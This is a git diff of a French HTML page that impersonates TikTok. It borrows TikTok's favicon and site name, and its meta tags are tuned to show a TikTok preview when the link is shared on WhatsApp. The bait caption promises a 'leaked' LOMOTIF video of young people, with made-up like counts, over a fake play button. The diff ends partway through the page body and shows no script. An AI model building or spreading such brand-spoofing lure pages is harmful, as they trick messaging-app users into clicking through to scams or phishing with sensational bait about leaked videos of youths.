@@ -1,384 +1,384 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!DOCTYPE html>
+    <html lang="fr">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <!-- Balises Open Graph pour l'aperçu TikTok sur WhatsApp -->
-    <meta property="og:title" content="@username • Vidéo TikTok originale">
-    <meta property="og:description" content="Découvrez cette vidéo incroyable qui fait le buzz ! 🔥✨ #viral #trending">
-    <meta property="og:image" content="https://p16-sign-va.tiktokcdn.com/obj/tos-maliva-p-0068/c5e8d4a0c9b44d4c8f7e3b2a1d6e9f8a?x-expires=1640995200&x-signature=example">
-    <meta property="og:url" content="https://votre-site.netlify.app">
-    <meta property="og:type" content="video.other">
-    <meta property="og:site_name" content="TikTok">
-    <meta property="og:image:width" content="720">
-    <meta property="og:image:height" content="1280">
+        <!-- Balises Open Graph pour l'aperçu TikTok sur WhatsApp -->
+        <meta property="og:title" content="TikTok • @username">
+        <meta property="og:description" content="4263 j'aime, 85 commentaires. « Voici la nouvelle vidéo LOMOTIF de ces jeunes qui a fuité - ! »">
+        <meta property="og:image" content="https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=400&h=600&fit=crop&crop=center">
+        <meta property="og:url" content="https://votre-site.vercel.app">
+        <meta property="og:type" content="video.other">
+        <meta property="og:site_name" content="TikTok">
+        <meta property="og:image:width" content="400">
+        <meta property="og:image:height" content="600">
 
-    <!-- Meta tags pour WhatsApp et autres plateformes -->
-    <meta name="twitter:card" content="player">
-    <meta name="twitter:title" content="@username • Vidéo TikTok originale">
-    <meta name="twitter:description" content="Découvrez cette vidéo incroyable qui fait le buzz ! 🔥✨ #viral #trending">
-    <meta name="twitter:image" content="https://p16-sign-va.tiktokcdn.com/obj/tos-maliva-p-0068/c5e8d4a0c9b44d4c8f7e3b2a1d6e9f8a?x-expires=1640995200&x-signature=example">
+        <!-- Meta tags pour WhatsApp et autres plateformes -->
+        <meta name="twitter:card" content="summary_large_image">
+        <meta name="twitter:title" content="TikTok • @username">
+        <meta name="twitter:description" content="4263 j'aime, 85 commentaires. « Voici la nouvelle vidéo LOMOTIF de ces jeunes qui a fuité - ! »">
+        <meta name="twitter:image" content="https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=400&h=600&fit=crop&crop=center">
 
-    <!-- Favicon TikTok -->
-    <link rel="icon" type="image/x-icon" href="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/webapp/main/webapp-desktop/8152caf0c8e8bc67ae0d.ico">
+        <!-- Favicon TikTok -->
+        <link rel="icon" type="image/x-icon" href="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/webapp/main/webapp-desktop/8152caf0c8e8bc67ae0d.ico">
 
-    <title>@username • Vidéo TikTok originale</title>
+        <title>@username • Vidéo TikTok originale</title>
 
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            }
 
-        body {
-            background: #000;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            overflow: hidden;
-        }
-
-        .tiktok-container {
-            width: 100%;
-            max-width: 375px;
-            height: 100vh;
-            background: linear-gradient(45deg, #ff0050, #ff0050, #000);
-            position: relative;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .video-preview {
-            width: 100%;
-            height: 100%;
-            background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT-zJFxwe1FMm7OCzeek9xfBJqOibm2dPeQLQ&s?text=TikTok+Video') center/cover;
-            position: relative;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .play-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.3);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 2;
-        }
-
-        .play-button {
-            width: 80px;
-            height: 80px;
-            background: rgba(255, 255, 255, 0.9);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            animation: pulse 2s infinite;
-            cursor: pointer;
-        }
-
-        .play-button::after {
-            content: '';
-            border-style: solid;
-            border-width: 15px 0 15px 25px;
-            border-color: transparent transparent transparent #000;
-            margin-left: 5px;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 0.9; }
-            50% { transform: scale(1.1); opacity: 1; }
-            100% { transform: scale(1); opacity: 0.9; }
-        }
-
-        .tiktok-ui {
-            position: absolute;
-            bottom: 100px;
-            left: 20px;
-            right: 70px;
-            z-index: 3;
-        }
-
-        .user-info {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-
-        .avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: linear-gradient(45deg, #ff0050, #ff4d6d);
-            margin-right: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 16px;
-            overflow: hidden;
-        }
-
-        .avatar img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;   /* remplit le div en gardant le ratio */
-        }
-
-        .username {
-            font-weight: 600;
-            font-size: 16px;
-            color: white;
-        }
-
-        .description {
-            font-size: 14px;
-            line-height: 1.4;
-            color: white;
-            margin-bottom: 10px;
-        }
-
-        .hashtags {
-            color: white;
-            font-weight: 600;
-        }
-
-        .side-actions {
-            position: absolute;
-            right: 15px;
-            bottom: 100px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 20px;
-            z-index: 3;
-        }
-
-        .action-btn {
-            width: 48px;
-            height: 48px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .action-btn:hover {
-            background: rgba(255, 255, 255, 0.3);
-            transform: scale(1.1);
-        }
-
-        .tiktok-logo {
-            position: absolute;
-            top: 60px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 4;
-        }
-
-        .tiktok-logo svg {
-            width: 100px;
-            height: 30px;
-        }
-
-        .loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            z-index: 999;
-        }
-
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid rgba(255, 0, 80, 0.3);
-            border-radius: 50%;
-            border-top-color: #ff0050;
-            animation: spin 1s ease-in-out infinite;
-            margin-bottom: 20px;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .instructions {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            right: 20px;
-            background: rgba(0, 0, 0, 0.8);
-            padding: 15px;
-            border-radius: 10px;
-            font-size: 12px;
-            z-index: 5;
-            display: none;
-        }
-
-        .show-instructions {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: rgba(255, 255, 255, 0.2);
-            color: white;
-            border: none;
-            padding: 10px;
-            border-radius: 5px;
-            cursor: pointer;
-            z-index: 6;
-        }
-
-        @media (min-width: 768px) {
-            .tiktok-container {
-                max-width: 375px;
-                height: 667px;
-                border-radius: 15px;
+            body {
+                background: #000;
+                min-height: 100vh;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                color: white;
                 overflow: hidden;
-                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+            }
+
+            .tiktok-container {
+                width: 100%;
+                max-width: 375px;
+                height: 100vh;
+                background: linear-gradient(45deg, #ff0050, #ff0050, #000);
+                position: relative;
+                cursor: pointer;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .video-preview {
+                width: 100%;
+                height: 100%;
+                background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT-zJFxwe1FMm7OCzeek9xfBJqOibm2dPeQLQ&s?text=TikTok+Video') center/cover;
+                position: relative;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .play-overlay {
+                position: absolute;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0, 0, 0, 0.3);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 2;
+            }
+
+            .play-button {
+                width: 80px;
+                height: 80px;
+                background: rgba(255, 255, 255, 0.9);
+                border-radius: 50%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                animation: pulse 2s infinite;
+                cursor: pointer;
+            }
+
+            .play-button::after {
+                content: '';
+                border-style: solid;
+                border-width: 15px 0 15px 25px;
+                border-color: transparent transparent transparent #000;
+                margin-left: 5px;
+            }
+
+            @keyframes pulse {
+                0% { transform: scale(1); opacity: 0.9; }
+                50% { transform: scale(1.1); opacity: 1; }
+                100% { transform: scale(1); opacity: 0.9; }
+            }
+
+            .tiktok-ui {
+                position: absolute;
+                bottom: 100px;
+                left: 20px;
+                right: 70px;
+                z-index: 3;
+            }
+
+            .user-info {
+                display: flex;
+                align-items: center;
+                margin-bottom: 15px;
+            }
+
+            .avatar {
+                width: 40px;
+                height: 40px;
+                border-radius: 50%;
+                background: linear-gradient(45deg, #ff0050, #ff4d6d);
+                margin-right: 12px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-weight: bold;
+                font-size: 16px;
+                overflow: hidden;
+            }
+
+            .avatar img {
+                width: 100%;
+                height: 100%;
+                object-fit: cover;   /* remplit le div en gardant le ratio */
+            }
+
+            .username {
+                font-weight: 600;
+                font-size: 16px;
+                color: white;
+            }
+
+            .description {
+                font-size: 14px;
+                line-height: 1.4;
+                color: white;
+                margin-bottom: 10px;
+            }
+
+            .hashtags {
+                color: white;
+                font-weight: 600;
+            }
+
+            .side-actions {
+                position: absolute;
+                right: 15px;
+                bottom: 100px;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                gap: 20px;
+                z-index: 3;
+            }
+
+            .action-btn {
+                width: 48px;
+                height: 48px;
+                background: rgba(255, 255, 255, 0.2);
+                border-radius: 50%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-size: 24px;
+                cursor: pointer;
+                transition: all 0.3s ease;
+            }
+
+            .action-btn:hover {
+                background: rgba(255, 255, 255, 0.3);
+                transform: scale(1.1);
+            }
+
+            .tiktok-logo {
+                position: absolute;
+                top: 60px;
+                left: 50%;
+                transform: translateX(-50%);
+                z-index: 4;
+            }
+
+            .tiktok-logo svg {
+                width: 100px;
+                height: 30px;
+            }
+
+            .loading-screen {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: #000;
+                display: none;
+                align-items: center;
+                justify-content: center;
+                flex-direction: column;
+                z-index: 999;
+            }
+
+            .spinner {
+                width: 50px;
+                height: 50px;
+                border: 3px solid rgba(255, 0, 80, 0.3);
+                border-radius: 50%;
+                border-top-color: #ff0050;
+                animation: spin 1s ease-in-out infinite;
+                margin-bottom: 20px;
+            }
+
+            @keyframes spin {
+                to { transform: rotate(360deg); }
             }
 
             .instructions {
-                display: block;
-                position: relative;
-                margin-top: 20px;
-                max-width: 375px;
+                position: absolute;
+                top: 20px;
+                left: 20px;
+                right: 20px;
+                background: rgba(0, 0, 0, 0.8);
+                padding: 15px;
+                border-radius: 10px;
+                font-size: 12px;
+                z-index: 5;
+                display: none;
+            }
+
+            .show-instructions {
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: rgba(255, 255, 255, 0.2);
+                color: white;
+                border: none;
+                padding: 10px;
+                border-radius: 5px;
+                cursor: pointer;
+                z-index: 6;
+            }
+
+            @media (min-width: 768px) {
+                .tiktok-container {
+                    max-width: 375px;
+                    height: 667px;
+                    border-radius: 15px;
+                    overflow: hidden;
+                    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+                }
+
+                .instructions {
+                    display: block;
+                    position: relative;
+                    margin-top: 20px;
+                    max-width: 375px;
+                }
+            }
+        </style>
+    </head>
+    <body>
+    <button class="show-instructions" onclick="toggleInstructions()">ℹ️</button>
+
+    <div class="tiktok-container" id="tiktokContainer">
+        <div class="tiktok-logo">
+            <svg viewBox="0 0 118 42" fill="white">
+                <path d="M9.875 16.842V15.22c-.44-.043-.775-.087-1.22-.087C3.815 15.133 0 18.948 0 23.813c0 2.935 1.455 5.532 3.68 7.105a8.94 8.94 0 0 1-2.132-5.907c0-4.865 3.815-8.68 8.68-8.68.442 0 .884.044 1.322.087v-.586z"/>
+                <path d="M10.962 11.82v3.967c0 .263-.22.48-.483.48-.263 0-.483-.217-.483-.48V11.82c0-.263.22-.48.483-.48.263 0 .483.217.483.48z"/>
+            </svg>
+        </div>
+
+        <div class="video-preview">
+            <div class="play-overlay">
+                <div class="play-button"></div>
+            </div>
+        </div>
+
+        <div class="tiktok-ui">
+            <div class="user-info">
+                <div class="avatar flex">
+                    <img src="data:image/jpeg;base64,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">
+                </div>
+                <div class="username">@username</div>
+            </div>
+            <div class="description">
+                Voici la nouvelle vidéo LOMOTIF de ces jeunes qui a fuité - ! 🔥✨
+            </div>
+            <div class="hashtags">#viral #trending #fyp #foryou</div>
+        </div>
+
+        <div class="side-actions">
+            <div class="action-btn">
